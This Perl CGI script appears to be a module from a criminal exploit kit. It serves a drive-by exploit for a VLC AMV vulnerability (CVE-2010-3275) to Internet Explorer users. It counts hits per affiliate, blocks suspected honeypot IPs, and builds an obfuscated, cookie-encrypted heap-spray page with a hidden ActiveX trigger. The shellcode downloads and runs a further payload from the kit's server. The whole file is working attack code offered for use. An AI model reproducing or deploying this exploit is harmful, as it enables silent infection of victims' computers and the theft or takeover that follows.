#!/usr/bin/perl

#
# VLC media player amv
#
# work XP / Vista / IE 6 and 7

use CGI;
use DBI;
use Geo::IP;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET vlc_amv=vlc_amv+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";


$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');
$flavor = $q->param('flavor');
$amvornot = $q->param('url');

########### HoneyPot Function to test ################
$theip = $ENV{REMOTE_ADDR};
$referer = $ENV{HTTP_REFERER};

#IP to Country
$gi = Geo::IP->open( '../dep/GeoIP.dat' );
my $country = $gi->country_code_by_addr($theip);

#Convert IP for database
my (@octets,$octet,$ip_number,$number_convert,$ip_address);
$ip_address = $theip;
chomp ($ip_address);
@octets = split(/\./, $ip_address);
$ip_number = 0;
foreach $octet (@octets) {
$ip_number <<= 8;
$ip_number |= $octet;
}

$doubleip = "";
$verifdoubleipch = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
if($verifdoubleipch eq "")
{
  #Insert the system stats and check if the IP already exist
  $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'ms11_xxx.pl', 'HoneyPot')";
  $statement = $dbh->prepare($sql);
  $statement->execute() or $doubleip = 1;
  $doubleip = 1;
}
else
{
  $doubleip = 1;
}

######################################

if($doubleip eq "1")
{

  $checkvalueavs = "";
  #Check if ip equal to HoneyPot in database (not serving the exploit in this case)
  $checkvalueavs = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");

if($checkvalueavs eq 'HoneyPot')
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}
else
{
  if($amvornot =~ 'amv')
  {
    open(FILE,"<../dep/CVE-2010-3275.amv");
    while(<FILE>)
    {
      $dataamv .= $_;
    }
    print $q->header(-type=> 'text/plain');
    print $dataamv;
  }
  else
  {
    if($referer ne "")
    {
      #Insert the view param on exploit
      $sql = "UPDATE exploits SET vlc_amv=vlc_amv+1 WHERE affid='$aff'";
      $statement = $dbh->prepare($sql);
      $statement->execute(); #or print "$DBI::errstr";

      #get the cookie value from name
      $theCookie = $q->cookie($csname);

      #get browser version to dispatch hex value
      $useragent = $ENV{HTTP_USER_AGENT};
      $useragent =~ tr/[A-Z]/[a-z]/;
      $uaname = 'MSIE' if($useragent =~ "msie");
      if($uaname eq 'MSIE') #IE
      {
        $uacheckie = $useragent;
        $uacheckie =~ /msie (.*?);/g;
        $uaver = $1;
      }
      $browserver = $uaver;

      #Get Ret for good system
      if($flavor eq 'XP' and $browserver =~ '7')
      {
        $ret = 0x1c1c1c1c;
        $nopsled = '%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c%u1c1c';
      }
      else
      {
        $ret = 0x0c0c0c0c;
        $nopsled = '%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c';
      }
      
      #shellcode
      $urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=realplayer_cdda';
      $shellcode = Shellcode::getshell($urlllll);

      #Random JS vars
      $js_func_name             = JsXOR::generate_random_string(int(rand 6) + 3);
      $js_var_blocks_name       = JsXOR::generate_random_string(int(rand 6) + 3);
      $js_var_shell_name        = JsXOR::generate_random_string(int(rand 6) + 3);
      $js_var_nopsled_name      = JsXOR::generate_random_string(int(rand 6) + 3);
      $js_var_index_name        = JsXOR::generate_random_string(int(rand 6) + 3);
      $trigger_file             = 'vlc_amv.pl?url=amv';

      #JAVASCRIPT DATA
      my $data = <<EOF;

function $js_func_name() {
var $js_var_blocks_name = new Array();
var $js_var_shell_name = unescape("$shellcode");
var $js_var_nopsled_name = unescape("$nopsled");
do { $js_var_nopsled_name += $js_var_nopsled_name } while ($js_var_nopsled_name.length < 82000);
for ($js_var_index_name=0; $js_var_index_name < 3000; $js_var_index_name++) {
$js_var_blocks_name[$js_var_index_name] = $js_var_nopsled_name + $js_var_shell_name;
}
}
$js_func_name();

EOF

      #Crypt the JS
      $beforexoredd = EncRand::CsCrypt($data,$csname,$theCookie);

      #HTML DATA
      my $htmldat = <<HEOF;
<html>
<head>
<script>
$beforexoredd
</script>
</head>
<body>
<object classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
width="0" height="0"
events="True">
<param name="Src" value="$trigger_file"></param>
<param name="ShowDisplay" value="False" ></param>
<param name="AutoLoop" value="no"></param>
<param name="AutoPlay" value="yes"></param>
</object>
</body>
</html>

HEOF

      ###### BEGIN PRINT EXPLOIT #########
      print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

      print $htmldat;

      ####### END PRINT EXPLOIT ##########
    }
  }
}
}
$dbh->disconnect();

1;
